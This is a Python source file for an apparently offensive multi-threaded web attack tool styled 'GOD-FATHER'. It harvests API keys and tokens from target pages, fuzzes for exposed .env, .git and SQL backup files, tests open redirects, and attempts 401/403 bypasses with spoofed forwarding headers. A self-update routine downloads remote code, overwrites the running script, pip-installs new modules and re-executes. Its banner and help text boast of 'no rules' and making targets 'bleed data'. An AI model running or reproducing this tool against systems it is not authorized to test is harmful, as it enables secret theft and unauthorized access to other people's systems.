import requests
import re
import argparse
import urllib3
import os
import sys
import threading
import uuid
import time
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from colorama import Fore, init, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

session = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=1000, pool_maxsize=1500, max_retries=0)
session.mount('http://', adapter)
session.mount('https://', adapter)

stats = {"ep": 0, "ky": 0, "or": 0, "bp": 0, "sf": 0, "scanned": 0, "total": 0, "live": 0}
seen_secrets = set()
seen_paths = set()
processed_urls = set()
p_lock = threading.Lock()

OR_PAYLOADS = ["https://bing.com", "//bing.com", "/\\/bing.com"]
BYPASS_HEADERS = [
    {'X-Forwarded-For': '127.0.0.1'}, {'X-Forwarded-Host': '127.0.0.1'},
    {'X-Original-URL': '/admin'}, {'X-Rewrite-URL': '/admin'},
    {'X-Remote-IP': '127.0.0.1'}, {'X-Custom-IP-Authorization': '127.0.0.1'}
]

def get_line(char="─"):
    try:
        columns = os.get_terminal_size().columns
    except:
        columns = 80
    return f"{Fore.RED}{char * columns}"

def print_banner():
    line = get_line("═")
    b = f"""{Fore.RED}{Style.BRIGHT}
  ▄██████▄   ▄██████▄  ████████▄   ▄████████  ▄██████▄  ██████████  ███    █▄  ███████   ████████▄ 
 ███    ███ ███    ███ ███    ███  ███        ███   ███     ███     ███    ███ ███       ███   ▀███
 ███    █▀  ███    ███ ███    ███  ███        ███   ███     ███     ███    ███ ███       ███    ███
 ███        ███    ███ ███    ███ ▄███▄▄▄     ███▄▄▄███     ███     ███▄▄▄▄███ ███▄▄▄    ████████▀ 
 ███    ███ ███    ███ ███    ███ ▀███▀▀▀     ███▀▀▀███     ███     ███▀▀▀▀███ ███▀▀▀    ███  ▀███ 
 ███    ██  ███    ███ ███    ███  ███        ███   ███     ███     ███    ███ ███       ███    ███
 ████████▀   ▀██████▀  ████████▀   ███        ███   ███     ███     ███    █▀  ███████   ███    █▀  

{line}
{Fore.RED}{Style.BRIGHT}   [!] SENSITIVE DATA CAN HIDE, BUT IT CAN'T ESCAPE THE FATHER.
{line}

{Fore.RED}   {Fore.WHITE}»{Fore.RED} SECRETS WILL BE EXTRACTED            {Fore.WHITE}AUTHOR  :{Fore.RED} DHARMVEER
{Fore.RED}   {Fore.WHITE}»{Fore.RED} MISCONFIGURATIONS WILL BE EXPLOITED {Fore.WHITE}VERSION :{Fore.RED} GOD-FATHER v17.0
{Fore.RED}   {Fore.WHITE}»{Fore.RED} SILENCE WILL NOT SAVE YOU            {Fore.WHITE}MODE    :{Fore.RED} NO RULES • NO MERCY

{Fore.RED}{"─" * 40}
{Fore.RED}   STATUS : {Fore.GREEN}ACTIVE HUNTING {Fore.RED}──► {Fore.WHITE}TARGETS WILL BLEED DATA
{line}
{Style.RESET_ALL}"""
    print(b)

def update_script():
    repo_raw = "https://raw.githubusercontent.com/D-666-V/THE_GOD_FATHER/main/GOD_FATHER.py"
    cache_bypass_url = f"{repo_raw}?nocache={int(time.time())}"
    print(f"{Fore.YELLOW}[*] Bypassing GitHub cache and fetching latest version...")
    headers = {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) {uuid.uuid4().hex[:6]}'
    }
    try:
        resp = requests.get(cache_bypass_url, headers=headers, timeout=20)
        if resp.status_code == 200:
            new_code = resp.text
            new_imports = re.findall(r'^(?:import|from)\s+([a-zA-Z0-9_]+)', new_code, re.M)
            current_modules = sys.modules.keys()
            with open(__file__, "w", encoding='utf-8') as f:
                f.write(new_code)
            print(f"{Fore.GREEN}[+] Code updated successfully!")
            for mod in set(new_imports):
                if mod not in current_modules and mod not in sys.builtin_module_names:
                    try:
                        print(f"{Fore.CYAN}[*] Installing new dependency: {mod}...")
                        subprocess.check_call([sys.executable, "-m", "pip", "install", mod], stdout=subprocess.DEVNULL)
                    except: pass
            print(f"{Fore.GREEN}[!] GOD-FATHER is now fresh. Restarting...")
            clean_args = [a for a in sys.argv if a not in ['-up', '--update']]
            os.execv(sys.executable, [sys.executable] + clean_args)
        else:
            print(f"{Fore.RED}[!] Update failed. Status: {resp.status_code}")
    except Exception as e:
        print(f"{Fore.RED}[!] Update error: {e}")
    sys.exit(1)

def update_status():
    with p_lock:
        perc = (stats['scanned'] / stats['total']) * 100 if stats['total'] > 0 else 0
        status_line = f"\r\033[K{Fore.BLUE}[{stats['scanned']}/{stats['total']}] {perc:.1f}% - {Fore.GREEN}Live:{stats['live']} {Fore.CYAN}EP:{stats['ep']} {Fore.RED}KY:{stats['ky']} {Fore.MAGENTA}OR:{stats['or']} {Fore.YELLOW}BP:{stats['bp']} {Fore.GREEN}SF:{stats['sf']}"
        sys.stdout.write(status_line)
        sys.stdout.flush()

def log_result(label, value, source_url, color=Fore.WHITE, is_vuln=False):
    with p_lock:
        if "ENDPOINT" in label or "GOLDMINE-EP" in label: stats["ep"] += 1
        elif "OR" in label: stats["or"] += 1
        elif "BP" in label: stats["bp"] += 1
        elif "SENS-FILE" in label: stats["sf"] += 1
        elif any(k in label for k in ["KEY", "TOKEN"]): stats["ky"] += 1
        sys.stdout.write("\r\033[K")
        if is_vuln:
            output = f"{Fore.MAGENTA}!!! [VULNERABLE-{label}] {value} !!!"
        else:
            output = f"{color}[{label}] {value}"
        sys.stdout.write(f"{output}\n")
    update_status()

def save_to_file(output_file, data_type, value, source):
    if not output_file: return
    with open(output_file, 'a', encoding='utf-8') as f:
        f.write(f"[{data_type}] {value} | {source}\n")

def test_or_poc(url, output_file):
    try:
        parsed_url = urlparse(url)
        if not parsed_url.query: return
        params = parse_qs(parsed_url.query)
        target_keys = ['url', 'redirect', 'next', 'dest', 'path', 'uri', 'to', 'out', 'domain', 'host']
        rand_dom = f"gf{uuid.uuid4().hex[:6]}.com"
        payload = f"https://{rand_dom}"
        for key in params:
            if any(tk in key.lower() for tk in target_keys):
                orig_val = params[key]
                params[key] = [payload]
                test_url = urlunparse(parsed_url._replace(query=urlencode(params, doseq=True)))
                try:
                    r = session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    loc = r.headers.get('Location', '')
                    if r.status_code in [301, 302, 303, 307, 308] and rand_dom in loc:
                        log_result("OR", test_url, url, Fore.MAGENTA + Style.BRIGHT, is_vuln=True)
                        save_to_file(output_file, "OPEN-REDIRECT", test_url, url)
                        return
                except: pass
                params[key] = orig_val
    except: pass

def try_bypass(url, output_file):
    try:
        original_r = session.get(url, timeout=4, verify=False, allow_redirects=False)
        orig_status = original_r.status_code
        orig_size = len(original_r.content)
        if orig_status == 200: return False
        f_paths = [url, url + "/%2e/", url + "..;/"] 
        for f_path in f_paths:
            for header in BYPASS_HEADERS:
                try:
                    r = session.get(f_path, headers=header, timeout=4, verify=False, allow_redirects=False)
                    if r.status_code == 200 and len(r.content) != orig_size and len(r.content) > 100:
                        low_content = r.text.lower()
                        bad_keywords = ["access denied", "forbidden", "unauthorized", "login", "signin"]
                        if not any(word in low_content for word in bad_keywords):
                            log_result("BP-SUCCESS", f"{f_path} (Header: {list(header.keys())[0]})", url, Fore.YELLOW + Style.BRIGHT)
                            save_to_file(output_file, "BYPASS-SUCCESS", f_path, f"Header: {list(header.keys())[0]}")
                            return True
                except: pass
    except: pass
    return False

def scan_logic(content, source_url, output_file, args):
    if args.ep or args.all:
        ep_pat = r'["\'](/(?:api|v[0-9]|v3|graphql|admin|auth|config|internal|web-api|rest|hidden|debug|v4)/[a-zA-Z0-9\-_/.]+)["\']|["\'](https?://[a-zA-Z0-9.\-_/]+(?:api|v[0-9]|v3|graphql|internal|debug|v4)[a-zA-Z0-9.\-_/]*)["\']'
        for match in re.findall(ep_pat, content):
            val = match[0] if match[0] else match[1]
            val_lower = val.lower()
            media_exts = ('.jpg', '.jpeg', '.png', '.gif', '.svg', '.pdf', '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.css', '.ico', '.js', '.map', '.txt', '.zip')
            junk_paths = ('/uploads/', '/assets/', '/static/', '/media/', '/images/', 'google-analytics', 'twitter.com', 'facebook.com', 'fonts.', 'cloudinary.', 'instagram.')
            if not val or any(val_lower.endswith(ext) for ext in media_exts) or any(jp in val_lower for jp in junk_paths):
                continue
            path_sig = re.sub(r'/\d+', '/{ID}', val)
            if path_sig in seen_paths: continue
            seen_paths.add(path_sig)
            gold_keys = ['admin', 'config', 'internal', 'env', 'secret', 'auth', 'setup', 'db', 'sql', 'debug', 'monitor', 'backup', 'vault', 'login', 'signin', 'logout']
            is_gold = any(gk in val_lower for gk in gold_keys)
            label = "GOLDMINE-EP" if is_gold else "ENDPOINT"
            color = Fore.CYAN + Style.BRIGHT if is_gold else Fore.CYAN
            log_result(label, val, source_url, color)
            save_to_file(output_file, label, val, source_url)
    if args.ky or args.all:
        patterns = {
            "GOOGLE_KEY": r'\bAIza[0-9A-Za-z\-_]{35}\b',
            "AWS_ACCESS_KEY": r'\b(?:AKIA|ASIA)[0-9A-Z]{16}\b',
            "SLACK_TOKEN": r'\bxox[baprs]-[0-9a-zA-Z]{10,48}\b',
            "GITHUB_TOKEN": r'\b(?:ghp|gho|ghu|ghs|ghr)_[a-zA-Z0-9]{36}\b',
            "STRIPE_SECRET": r'\bsk_live_[0-9a-zA-Z]{24,}\b'
        }
        for label, pat in patterns.items():
            for m in re.findall(pat, content):
                if m not in seen_secrets:
                    if len(set(m)) < 6: continue 
                    display_msg = f"{m} {Fore.WHITE}at {Fore.BLUE}{source_url}"
                    log_result(label, display_msg, source_url, Fore.RED + Style.BRIGHT)
                    seen_secrets.add(m)
                    save_to_file(output_file, label, m, f"Found at: {source_url}")

def process_url(url, args):
    if url in processed_urls: return
    processed_urls.add(url)
    try:
        if args.sf or args.all:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            fuzz_p = {
                '.env': ['DB_HOST=', 'AWS_ACCESS_KEY', 'DB_PASSWORD=', 'APP_KEY='],
                '.git/config': ['[core]', 'repositoryformatversion'],
                'phpinfo.php': ['php version', 'system', 'build date'],
                'config.json': ['{', '"'],
                'backup.sql': ['insert into', 'create table'],
                'Dockerfile': ['from ', 'run ', 'expose ']
            }
            for sf_p, sigs in fuzz_p.items():
                f_url = f"{base.rstrip('/')}/{sf_p.lstrip('/')}"
                if f_url in processed_urls: continue
                processed_urls.add(f_url)
                try:
                    sr = session.get(f_url, timeout=4, verify=False, allow_redirects=False)
                    if sr.status_code == 200:
                        c_text = sr.text.lower()
                        c_type = sr.headers.get('Content-Type', '').lower()
                        if "html" not in c_type and any(s.lower() in c_text for s in sigs):
                            if len(sr.content) > 10:
                                log_result("SENS-FILE", f_url, url, Fore.GREEN + Style.BRIGHT)
                                save_to_file(args.output, "SENSITIVE-FILE", f_url, "Verified-Hit")
                except: pass
        if args.poc or args.all: test_or_poc(url, args.output)
        r = session.get(url, timeout=5, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
        if r.status_code == 200:
            if args.verify:
                with p_lock: stats["live"] += 1
            scan_logic(r.text, url, args.output, args)
        elif r.status_code in [401, 403] and (args.bp or args.all):
            try_bypass(url, args.output)
    except: pass
    with p_lock: stats["scanned"] += 1
    update_status()

def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-i", "--input")
    parser.add_argument("-t", "--threads", type=int, default=150)
    parser.add_argument("-o", "--output", default=None) 
    parser.add_argument("-d", "--domain")
    parser.add_argument("-v", "--verify", action="store_true")
    parser.add_argument("-ky", action="store_true")
    parser.add_argument("-ep", action="store_true")
    parser.add_argument("-bp", action="store_true")
    parser.add_argument("-sf", action="store_true")
    parser.add_argument("-poc", action="store_true")
    parser.add_argument("-all", action="store_true")
    parser.add_argument("-up", "--update", action="store_true") 
    parser.add_argument("-h", "--help", action="store_true")
    args = parser.parse_args()

    if args.update: update_script()
    print_banner()

    if args.help or not args.input:
        line = get_line()
        help_menu = f"""
{Fore.RED}💀 {Style.BRIGHT}COMMAND CENTER : THE RULES OF WAR
{line}
{Fore.WHITE}USAGE: {Fore.GREEN}python3 {os.path.basename(__file__)} -i <targets.txt> [COMMANDS]

{Fore.RED}[ TARGET ACQUISITION ]
  {Fore.WHITE}-i, --input     {Fore.YELLOW}» {Fore.WHITE}Target list to bleed (Required)
  {Fore.WHITE}-t, --threads   {Fore.YELLOW}» {Fore.WHITE}Attack speed (Default: 150)
  {Fore.WHITE}-o, --output    {Fore.YELLOW}» {Fore.WHITE}Loot storage file (Optional)
  {Fore.WHITE}-d, --domain    {Fore.YELLOW}» {Fore.WHITE}Focus on a specific bloodline (Domain)

{Fore.RED}[ WEAPON SYSTEMS ]
  {Fore.WHITE}-v              {Fore.CYAN}» {Fore.WHITE}SOUL SCAN       {Fore.YELLOW}| {Fore.CYAN}Verify 200 OK Live targets
  {Fore.WHITE}-ky             {Fore.CYAN}» {Fore.WHITE}KEY EXTRACTOR   {Fore.YELLOW}| {Fore.CYAN}Rip out API Keys (AWS, Google, etc.)
  {Fore.WHITE}-ep             {Fore.CYAN}» {Fore.WHITE}VEIN FINDER     {Fore.YELLOW}| {Fore.CYAN}Deep Endpoint & Admin path mining
  {Fore.WHITE}-bp             {Fore.CYAN}» {Fore.WHITE}GATE CRASHER    {Fore.YELLOW}| {Fore.CYAN}Forced bypass for 403/401 walls
  {Fore.WHITE}-sf             {Fore.CYAN}» {Fore.WHITE}FILE HUNTER     {Fore.YELLOW}| {Fore.CYAN}Fuzz for .env, .git, and secrets
  {Fore.WHITE}-poc            {Fore.CYAN}» {Fore.WHITE}REDIRECT POISON {Fore.YELLOW}| {Fore.CYAN}Execute Open Redirect POCs
  {Fore.WHITE}-all            {Fore.GREEN}» {Fore.WHITE}GODFATHER MODE  {Fore.YELLOW}| {Fore.GREEN}TOTAL ANNIHILATION (All Modules)

{Fore.RED}[ UTILITIES ]
  {Fore.WHITE}-up, --update   {Fore.MAGENTA}» {Fore.WHITE}Reforge the blade (Fetch latest build)
  {Fore.WHITE}-h, --help      {Fore.MAGENTA}» {Fore.WHITE}Show this manual of destruction

{line}
{Fore.RED} [!] {Fore.WHITE}WARNING: DATA IS FRAGILE. THE FATHER IS NOT.
        """
        print(help_menu)
        sys.exit(0)
    try:
        with open(args.input, 'r', encoding='utf-8', errors='ignore') as f:
            urls = list(set(line.strip() for line in f if line.strip()))
        stats["total"] = len(urls)
        update_status()
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = [executor.submit(process_url, url, args) for url in urls]
            for future in as_completed(futures): pass
        print(f"\n\n{Fore.GREEN} GOD-FATHER HUNTING COMPLETE")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(0)
